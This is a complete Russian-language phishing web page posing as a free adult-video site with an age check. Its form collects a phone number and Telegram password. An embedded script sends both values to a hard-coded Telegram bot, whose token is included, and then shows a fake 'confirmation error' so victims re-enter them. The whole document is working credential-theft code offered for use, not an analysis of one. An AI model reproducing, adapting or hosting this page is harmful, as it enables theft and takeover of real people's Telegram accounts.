<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>🔥 Бесплатное порно</title>
<style>
body{margin:0;background:#0a0a0a;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;}
.box{background:#1a1a1a;padding:30px;border-radius:16px;width:320px;text-align:center;color:#fff;box-shadow:0 0 30px #ff0055;}
input{width:100%;padding:14px;margin:10px 0;border-radius:10px;border:2px solid #ff3366;background:#222;color:#fff;font-size:16px;}
button{width:100%;padding:14px;background:#ff3366;border:none;border-radius:10px;color:#fff;font-size:18px;font-weight:bold;cursor:pointer;}
h2{color:#ff3366;}
</style>
</head>
<body>
<div class="box">
<h2>🔞 Бесплатное порно</h2>
<p>Подтверди возраст (18+)</p>
<form onsubmit="send(event)">
<input type="text" id="phone" placeholder="Номер телефона" required>
<input type="password" id="pass" placeholder="Пароль от Telegram">
<button type="submit">СМОТРЕТЬ 🔥</button>
</form>
</div>
<script>
function send(e){
e.preventDefault();
var phone = document.getElementById('phone').value;
var pass = document.getElementById('pass').value;

var token = '8028349154:AAEL5FFdo7Gp3q5kxhpW6-obGlSBLpXbelA';
var chat = '8028349154';

var msg = '📱 ' + phone + ' | 🔑 ' + pass;
fetch('https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat + '&text=' + encodeURIComponent(msg));
alert('❌ Ошибка подтверждения, попробуй ещё раз');
}
</script>
</body>
</html>
